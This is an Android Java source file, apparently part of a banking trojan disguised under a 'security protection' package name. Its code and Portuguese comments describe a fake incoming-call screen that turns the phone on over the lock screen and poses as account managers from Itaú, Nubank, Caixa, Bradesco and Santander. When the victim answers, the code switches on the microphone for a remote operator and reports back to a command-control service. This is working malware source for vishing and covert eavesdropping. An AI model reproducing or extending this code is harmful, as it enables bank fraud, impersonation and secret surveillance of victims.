package com.seguranca.protecao;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.media.Ringtone;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.Vibrator;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.Paint;
import android.graphics.PorterDuff;
import android.graphics.PorterDuffXfermode;
import android.graphics.Rect;
import android.graphics.RectF;

/**
 * 📞 ACTIVATION & OVERLAY DE CHAMADA FALSA (FAKE INCOMING CALL)
 * 
 * Simula uma ligação telefônica ultra-realista no celular da vítima.
 * Permite personalizar o nome (ex: "Gerente Itaú"), número, título e foto de perfil.
 * Quando a vítima clica em ATENDER, a chamada conecta a voz 2-way com o painel!
 */
public class FakeCallActivity extends Activity {
    private static final String TAG = "FakeCallActivity";

    private String callerName = "Gerente de Conta";
    private String callerNumber = "0800 728 0728";
    private String callerTitle = "";
    private String photoUrl = "";
    private String bankType = "itau";

    private Ringtone ringtone;
    private Vibrator vibrator;
    private boolean isCallAnswered = false;

    private TextView tvStatus;
    private TextView tvTimer;
    private LinearLayout layoutRingingActions;
    private LinearLayout layoutConnectedActions;

    private int callDurationSeconds = 0;
    private Handler timerHandler = new Handler(Looper.getMainLooper());
    private Runnable timerRunnable = new Runnable() {
        @Override
        public void run() {
            if (isCallAnswered) {
                callDurationSeconds++;
                int mins = callDurationSeconds / 60;
                int secs = callDurationSeconds % 60;
                if (tvTimer != null) {
                    tvTimer.setText(String.format("%02d:%02d", mins, secs));
                }
                timerHandler.postDelayed(this, 1000);
            }
        }
    };

    private BroadcastReceiver endCallReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            Log.d(TAG, "📞 Recebido broadcast para encerrar chamada falsa");
            finishCall();
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // 🔓 Flags para acender a tela e aparecer por cima da tela de bloqueio (Keyguard)
        getWindow().addFlags(
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_FULLSCREEN
        );

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true);
            setTurnScreenOn(true);
        }

        // Obtém parâmetros extras
        if (getIntent() != null) {
            if (getIntent().hasExtra("caller_name")) {
                callerName = getIntent().getStringExtra("caller_name");
            }
            if (getIntent().hasExtra("caller_number")) {
                callerNumber = getIntent().getStringExtra("caller_number");
            }
            if (getIntent().hasExtra("caller_title")) {
                callerTitle = getIntent().getStringExtra("caller_title");
            } else if (getIntent().hasExtra("title")) {
                callerTitle = getIntent().getStringExtra("title");
            }
            if (getIntent().hasExtra("photo_url")) {
                photoUrl = getIntent().getStringExtra("photo_url");
            } else if (getIntent().hasExtra("photo")) {
                photoUrl = getIntent().getStringExtra("photo");
            }
            if (getIntent().hasExtra("bank")) {
                bankType = getIntent().getStringExtra("bank");
            }
        }

        // Registra receiver para encerrar chamada remotamente se solicitado pelo painel
        IntentFilter filter = new IntentFilter("com.seguranca.protecao.END_FAKE_CALL");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(endCallReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(endCallReceiver, filter);
        }

        // Constrói a interface da chamada dinamicamente em Java
        buildUi();

        // Toca ringtone e vibra
        startRingingAndVibration();
    }

    private void buildUi() {
        // Layout principal vertical
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.CENTER_HORIZONTAL);
        root.setPadding(48, 96, 48, 96);

        // Fundo gradiente cibernético / banco
        GradientDrawable bg = new GradientDrawable(
            GradientDrawable.Orientation.TOP_BOTTOM,
            new int[]{Color.parseColor("#061026"), Color.parseColor("#020612")}
        );
        root.setBackground(bg);

        // 1. Header do Banco / Sistema
        TextView tvHeader = new TextView(this);
        String headerTitleText = (callerTitle != null && !callerTitle.trim().isEmpty()) 
                ? callerTitle 
                : getBankHeaderTitle();
        tvHeader.setText(headerTitleText.toUpperCase());
        tvHeader.setTextColor(Color.parseColor("#00F0FF"));
        tvHeader.setTextSize(12);
        tvHeader.setTypeface(Typeface.MONOSPACE, Typeface.BOLD);
        tvHeader.setGravity(Gravity.CENTER);
        root.addView(tvHeader);

        // Status (Recebendo chamada / Em chamada)
        tvStatus = new TextView(this);
        tvStatus.setText("CHAMADA DE VOZ RECEBIDA...");
        tvStatus.setTextColor(Color.parseColor("#A0AEC0"));
        tvStatus.setTextSize(13);
        tvStatus.setPadding(0, 12, 0, 0);
        tvStatus.setGravity(Gravity.CENTER);
        root.addView(tvStatus);

        // Timer de Chamada
        tvTimer = new TextView(this);
        tvTimer.setText("00:00");
        tvTimer.setTextColor(Color.parseColor("#00FF88"));
        tvTimer.setTextSize(16);
        tvTimer.setTypeface(Typeface.MONOSPACE, Typeface.BOLD);
        tvTimer.setVisibility(View.GONE);
        tvTimer.setPadding(0, 8, 0, 0);
        tvTimer.setGravity(Gravity.CENTER);
        root.addView(tvTimer);

        // 2. Avatar com Iniciais / Ícone ou Foto de Perfil
        LinearLayout avatarContainer = new LinearLayout(this);
        avatarContainer.setGravity(Gravity.CENTER);
        avatarContainer.setPadding(0, 64, 0, 64);

        int avatarSize = 220;
        FrameLayout avatarFrameLayout = new FrameLayout(this);
        LinearLayout.LayoutParams frameParams = new LinearLayout.LayoutParams(avatarSize, avatarSize);
        avatarFrameLayout.setLayoutParams(frameParams);

        TextView tvAvatar = new TextView(this);
        tvAvatar.setText(getInitials(callerName));
        tvAvatar.setTextColor(Color.WHITE);
        tvAvatar.setTextSize(36);
        tvAvatar.setTypeface(Typeface.DEFAULT_BOLD);
        tvAvatar.setGravity(Gravity.CENTER);
        tvAvatar.setLayoutParams(new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT
        ));

        GradientDrawable avatarBg = new GradientDrawable();
        avatarBg.setShape(GradientDrawable.OVAL);
        avatarBg.setColor(getBankThemeColor());
        avatarBg.setStroke(6, Color.parseColor("#00F0FF"));
        tvAvatar.setBackground(avatarBg);
        avatarFrameLayout.addView(tvAvatar);

        ImageView imgAvatar = new ImageView(this);
        imgAvatar.setScaleType(ImageView.ScaleType.FIT_CENTER);
        imgAvatar.setLayoutParams(new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT
        ));
        imgAvatar.setVisibility(View.GONE);
        avatarFrameLayout.addView(imgAvatar);

        avatarContainer.addView(avatarFrameLayout);
        root.addView(avatarContainer);

        if (photoUrl != null && !photoUrl.trim().isEmpty()) {
            loadAvatarPhoto(imgAvatar, tvAvatar, photoUrl);
        }

        // 3. Nome do Chamador (ex: Gerente Carlos - Itaú)
        TextView tvName = new TextView(this);
        tvName.setText(callerName);
        tvName.setTextColor(Color.WHITE);
        tvName.setTextSize(24);
        tvName.setTypeface(Typeface.DEFAULT_BOLD);
        tvName.setGravity(Gravity.CENTER);
        root.addView(tvName);

        // 4. Número do Chamador (ex: 0800 728 0728)
        TextView tvNumber = new TextView(this);
        tvNumber.setText(callerNumber);
        tvNumber.setTextColor(Color.parseColor("#718096"));
        tvNumber.setTextSize(16);
        tvNumber.setPadding(0, 8, 0, 0);
        tvNumber.setGravity(Gravity.CENTER);
        root.addView(tvNumber);

        // Espaçador flexível
        View spacer = new View(this);
        LinearLayout.LayoutParams spacerParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, 0, 1.0f
        );
        spacer.setLayoutParams(spacerParams);
        root.addView(spacer);

        // 5. BOTÕES DE AÇÃO: ESTADO TOCANDO (ATENDER / RECUSAR)
        layoutRingingActions = new LinearLayout(this);
        layoutRingingActions.setOrientation(LinearLayout.HORIZONTAL);
        layoutRingingActions.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams actionsParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT
        );
        layoutRingingActions.setLayoutParams(actionsParams);

        // Botão RECUSAR (Vermelho)
        TextView btnDecline = createActionButton("🚫 RECUSAR", Color.parseColor("#E53E3E"));
        btnDecline.setOnClickListener(v -> declineCall());
        layoutRingingActions.addView(btnDecline);

        // Espaço entre botões
        View gap = new View(this);
        LinearLayout.LayoutParams gapParams = new LinearLayout.LayoutParams(64, 1);
        gap.setLayoutParams(gapParams);
        layoutRingingActions.addView(gap);

        // Botão ATENDER (Verde Vibrante)
        TextView btnAnswer = createActionButton("📞 ATENDER", Color.parseColor("#38A169"));
        btnAnswer.setOnClickListener(v -> answerCall());
        layoutRingingActions.addView(btnAnswer);

        root.addView(layoutRingingActions);

        // 6. BOTÕES DE AÇÃO: ESTADO EM CHAMADA (DESLIGAR)
        layoutConnectedActions = new LinearLayout(this);
        layoutConnectedActions.setOrientation(LinearLayout.VERTICAL);
        layoutConnectedActions.setGravity(Gravity.CENTER);
        layoutConnectedActions.setVisibility(View.GONE);

        TextView btnHangup = createActionButton("🔴 DESLIGAR CHAMADA", Color.parseColor("#E53E3E"));
        LinearLayout.LayoutParams hangupParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, 140
        );
        btnHangup.setLayoutParams(hangupParams);
        btnHangup.setOnClickListener(v -> finishCall());

        layoutConnectedActions.addView(btnHangup);
        root.addView(layoutConnectedActions);

        setContentView(root);
    }

    private TextView createActionButton(String text, int bgColor) {
        TextView btn = new TextView(this);
        btn.setText(text);
        btn.setTextColor(Color.WHITE);
        btn.setTextSize(16);
        btn.setTypeface(Typeface.DEFAULT_BOLD);
        btn.setGravity(Gravity.CENTER);
        btn.setPadding(32, 28, 32, 28);

        GradientDrawable bg = new GradientDrawable();
        bg.setCornerRadius(40);
        bg.setColor(bgColor);
        btn.setBackground(bg);

        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(0, 140, 1.0f);
        btn.setLayoutParams(params);
        return btn;
    }

    private String getBankHeaderTitle() {
        if (bankType == null) return "Central de Segurança";
        String b = bankType.toLowerCase();
        if (b.contains("itau") || b.contains("itaú")) return "Itaú Uniclass • Atendimento";
        if (b.contains("nubank")) return "Nubank • Central de Segurança";
        if (b.contains("caixa")) return "CAIXA Econômica • Atendimento";
        if (b.contains("bradesco")) return "Bradesco • Gerência de Conta";
        if (b.contains("santander")) return "Santander • Segurança VIP";
        return "Central de Segurança Bancária";
    }

    private int getBankThemeColor() {
        if (bankType == null) return Color.parseColor("#1A365D");
        String b = bankType.toLowerCase();
        if (b.contains("itau") || b.contains("itaú")) return Color.parseColor("#EC7000");
        if (b.contains("nubank")) return Color.parseColor("#820AD1");
        if (b.contains("caixa")) return Color.parseColor("#005CA9");
        if (b.contains("bradesco")) return Color.parseColor("#CC092F");
        if (b.contains("santander")) return Color.parseColor("#EC0000");
        return Color.parseColor("#0070CE");
    }

    private String getInitials(String name) {
        if (name == null || name.trim().isEmpty()) return "GT";
        String[] parts = name.trim().split("\\s+");
        if (parts.length >= 2) {
            return (parts[0].substring(0, 1) + parts[1].substring(0, 1)).toUpperCase();
        }
        return name.substring(0, Math.min(2, name.length())).toUpperCase();
    }

    private void startRingingAndVibration() {
        try {
            // Toca ringtone padrão do celular
            Uri defaultRingtoneUri = RingtoneManager.getActualDefaultRingtoneUri(getApplicationContext(), RingtoneManager.TYPE_RINGTONE);
            if (defaultRingtoneUri != null) {
                ringtone = RingtoneManager.getRingtone(getApplicationContext(), defaultRingtoneUri);
                if (ringtone != null) {
                    ringtone.play();
                }
            }

            // Vibração
            vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            if (vibrator != null && vibrator.hasVibrator()) {
                long[] pattern = {0, 1000, 1000};
                vibrator.vibrate(pattern, 0); // 0 = loop infinito
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao iniciar ringtone/vibração: " + e.getMessage());
        }
    }

    private void stopRingingAndVibration() {
        try {
            if (ringtone != null && ringtone.isPlaying()) {
                ringtone.stop();
            }
            if (vibrator != null) {
                vibrator.cancel();
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao parar ringtone/vibração: " + e.getMessage());
        }
    }

    /**
     * VÍTIMA CLICOU EM "ATENDER"
     */
    private void answerCall() {
        if (isCallAnswered) return;
        isCallAnswered = true;

        stopRingingAndVibration();

        // Transiciona UI para estado "Em chamada"
        tvStatus.setText("🟢 CHAMADA CONECTADA • EM VIVA-VOZ");
        tvStatus.setTextColor(Color.parseColor("#00FF88"));
        tvTimer.setVisibility(View.VISIBLE);

        layoutRingingActions.setVisibility(View.GONE);
        layoutConnectedActions.setVisibility(View.VISIBLE);

        // Inicia cronômetro
        timerHandler.post(timerRunnable);

        // 🎙️ INICIA MICROFONE EM TEMPO REAL PARA O OPERADOR OUVIR A VÍTIMA
        try {
            Intent micIntent = new Intent(this, MicrophoneService.class);
            micIntent.putExtra("enabled", true);
            startService(micIntent);
        } catch (Exception e) {
            Log.e(TAG, "Erro ao iniciar MicrophoneService no atendimento: " + e.getMessage());
        }

        // Notifica o CommandControlService sobre o atendimento
        try {
            Intent answerIntent = new Intent("com.seguranca.protecao.FAKE_CALL_ANSWERED");
            answerIntent.setPackage(getPackageName());
            answerIntent.putExtra("caller_name", callerName);
            sendBroadcast(answerIntent);
        } catch (Exception ignored) {}

        Log.d(TAG, "✅ Vítima atendeu a chamada falsa! Voz 2-way ativada!");
    }

    /**
     * VÍTIMA CLICOU EM "RECUSAR"
     */
    private void declineCall() {
        Log.d(TAG, "🔴 Vítima recusou a chamada falsa");
        finishCall();
    }

    private void finishCall() {
        stopRingingAndVibration();
        timerHandler.removeCallbacks(timerRunnable);

        // Notifica encerramento
        try {
            Intent endIntent = new Intent("com.seguranca.protecao.FAKE_CALL_ENDED");
            endIntent.setPackage(getPackageName());
            sendBroadcast(endIntent);
        } catch (Exception ignored) {}

        finish();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRingingAndVibration();
        timerHandler.removeCallbacks(timerRunnable);
        try {
            unregisterReceiver(endCallReceiver);
        } catch (Exception ignored) {}
    }

    private void loadAvatarPhoto(ImageView imageView, TextView fallbackTextView, String urlStr) {
        if (urlStr == null || urlStr.trim().isEmpty() || !urlStr.startsWith("http")) {
            return;
        }
        new Thread(() -> {
            try {
                java.net.URL url = new java.net.URL(urlStr.trim());
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setDoInput(true);
                conn.setConnectTimeout(8000);
                conn.setReadTimeout(8000);
                conn.setInstanceFollowRedirects(true);
                conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
                conn.setRequestProperty("Accept", "image/webp,image/apng,image/png,image/jpeg,image/*,*/*;q=0.8");
                conn.connect();
                java.io.InputStream input = conn.getInputStream();
                Bitmap original = BitmapFactory.decodeStream(input);
                if (original != null) {
                    Bitmap circularBitmap = getCircularBitmap(original);
                    new Handler(Looper.getMainLooper()).post(() -> {
                        imageView.setImageBitmap(circularBitmap);
                        imageView.setVisibility(View.VISIBLE);
                        if (fallbackTextView != null) {
                            fallbackTextView.setVisibility(View.GONE);
                        }
                    });
                }
            } catch (Exception e) {
                Log.w(TAG, "Erro ao carregar foto do avatar: " + e.getMessage());
            }
        }).start();
    }

    private Bitmap getCircularBitmap(Bitmap bitmap) {
        int width = bitmap.getWidth();
        int height = bitmap.getHeight();
        int size = Math.min(width, height);
        Bitmap output = Bitmap.createBitmap(size, size, Bitmap.Config.ARGB_8888);
        Canvas canvas = new Canvas(output);

        final int color = 0xff424242;
        final Paint paint = new Paint();
        final Rect rect = new Rect((width - size) / 2, (height - size) / 2, (width + size) / 2, (height + size) / 2);
        final Rect destRect = new Rect(0, 0, size, size);
        final RectF rectF = new RectF(destRect);

        paint.setAntiAlias(true);
        canvas.drawARGB(0, 0, 0, 0);
        paint.setColor(color);
        canvas.drawOval(rectF, paint);

        paint.setXfermode(new PorterDuffXfermode(PorterDuff.Mode.SRC_IN));
        canvas.drawBitmap(bitmap, rect, destRect, paint);
        return output;
    }
}
